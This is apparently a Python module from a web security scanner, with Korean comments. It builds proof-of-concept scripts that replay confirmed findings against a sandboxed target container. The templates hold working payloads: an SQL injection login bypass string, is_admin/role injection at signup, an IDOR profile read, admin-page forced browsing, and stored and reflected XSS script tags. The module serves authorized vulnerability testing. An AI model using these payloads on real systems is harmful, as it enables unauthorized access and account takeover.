"""PoC 스크립트 생성 — 확인된(취약) finding 을 격리 공격 컨테이너에서 재현하는
파이썬 코드로 변환한다. 각 스크립트는 공격 컨테이너에 미리 탑재된 ``poclib`` 을 쓴다:

    Client(TARGET)          대상 앱 클라이언트(세션·CSRF 자동 처리)
      .signup(extra=…)      회원가입(+로그인). extra 로 임의 필드 주입 가능
      .post(path, data)     JSON/폼 자동, CSRF 토큰 부착
      .get(path)            GET
      .my_id()              로그인한 사용자의 id
      .logged_in()          현재 세션이 인증 상태인지
    render(resp)            응답 HTML 을 "브라우저 속 브라우저" 패널로 보냄

``%%TARGET%%`` 는 세션의 대상 컨테이너 주소로 치환된다.
"""
from __future__ import annotations

from typing import Dict, List, Optional

_TARGET = "%%TARGET%%"


# check_id -> PoC 파이썬 소스. "방어 안 했다면" 성공하는 실제 공격.
_TEMPLATES: Dict[str, str] = {
    "privilege_escalation": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

# 가입 요청에 is_admin 을 실어 보낸다 — 서버가 그대로 믿는지
atk = Client(TARGET).signup(extra={"is_admin": True, "role": "admin"})
ctl = Client(TARGET).signup()                 # 대조군: 평범한 가입

a = atk.get("/admin"); c = ctl.get("/admin")
print(f"[atk] GET /admin -> {a.status_code}")
print(f"[ctl] GET /admin -> {c.status_code}")
if a.status_code == 200 and c.status_code != 200:
    print("[!] EXPLOITED: 클라이언트가 보낸 is_admin 을 신뢰 → 관리자 탈취")
    render(a)
else:
    print("[-] 방어됨: is_admin 주입이 무시됨")
''',

    "sqli": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

c = Client(TARGET)
payload = "' OR '1'='1' -- "
r = c.post("/login", {"username": payload, "password": "x"})
print(f"[*] /login  username={payload!r} -> {r.status_code}")
if c.logged_in():
    print("[!] EXPLOITED: 인증 우회 성공 — 첫 사용자로 로그인됨")
    render(c.get("/posts"))
else:
    print("[-] 방어됨: 매개변수 바인딩으로 인젝션 차단")
''',

    "idor_profile": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

usera = Client(TARGET).signup(username="usera", email="usera@poc.io")
userb = Client(TARGET).signup(username="userb", email="userb@poc.io")

uid = usera.my_id()                    # userA 자신의 id
r = userb.get(f"/users/{uid}")         # 공격: userB 세션으로 userA 프로필 조회
print(f"[*] userB -> GET /users/{uid} : {r.status_code}")
if "usera@poc.io" in r.text:
    print("[!] EXPLOITED: 타인(userA) 이메일 노출 → IDOR")
    render(r)
else:
    print("[-] 방어됨: 타인 리소스 접근 차단")
''',

    "access_control_admin": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

user = Client(TARGET).signup()         # 일반 사용자
for path in ("/admin", "/admin/users"):
    r = user.get(path)
    print(f"[*] 일반 사용자 GET {path} -> {r.status_code}")
    if r.status_code == 200 and "admin" in r.text.lower():
        print(f"[!] EXPLOITED: {path} 가 일반 사용자에게 노출 → 접근통제 실패")
        render(r); break
else:
    print("[-] 방어됨: 관리자 페이지 차단")
''',

    "stored_xss": '''\
from poclib import Client, render
import uuid
TARGET = "%%TARGET%%"

c = Client(TARGET).signup()
marker = "xss_" + uuid.uuid4().hex[:6]
c.post("/posts", {"title": "hi",
                  "content": f"<script>document.title='{marker}'</script>"})
r = c.get("/posts")
print("[*] 게시글 목록 렌더 확인...")
if "<script>" in r.text:
    print("[!] EXPLOITED: 스크립트가 이스케이프 없이 저장·출력됨 → 저장형 XSS")
    render(r)
else:
    print("[-] 방어됨: 템플릿 자동 이스케이프")
''',

    "reflected_xss": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

c = Client(TARGET)
payload = "<script>document.title='XSS'</script>"
r = c.get(f"/search?q={payload}")
print(f"[*] GET /search?q=<script> -> {r.status_code}")
if "<script>" in r.text:
    print("[!] EXPLOITED: 검색어가 이스케이프 없이 반사됨 → 반사형 XSS")
    render(r)
else:
    print("[-] 방어됨: 반사 지점 이스케이프")
''',
}


def has_poc(check_id: str) -> bool:
    return check_id in _TEMPLATES


def build_poc_source(check_id: str, target_url: str) -> Optional[str]:
    src = _TEMPLATES.get(check_id)
    return src.replace(_TARGET, target_url) if src else None


def is_attackable(finding: dict) -> bool:
    """PoC 탭 대상 = 재현 가능한 '확정 익스플로잇'만 (score 0). 부분·불확정 실패
    (idor control_broken=60, sqli error_leak=40 등)는 실제 익스플로잇이 아니라
    PoC 가 정직하게 '방어됨'으로 나오므로 탭을 띄우지 않는다."""
    return (
        has_poc(finding.get("check_id", ""))
        and not finding.get("passed")
        and not finding.get("skipped")
        and float(finding.get("score", 0) or 0) == 0
    )


def poc_terminals(findings: List[dict], target_url: str = "http://target:5000") -> List[dict]:
    """확정 익스플로잇 finding 만 → 터미널 탭 목록. ``target_url`` 은 세션의 대상
    컨테이너 주소(라이브 세션 없이 표시만 할 때는 플레이스홀더)."""
    out: List[dict] = []
    for f in findings:
        if not is_attackable(f):
            continue
        cid = f["check_id"]
        out.append({
            "check_id": cid,
            "label": f.get("label", cid),
            "owasp": f.get("owasp", ""),
            "code": build_poc_source(cid, target_url),
        })
    return out
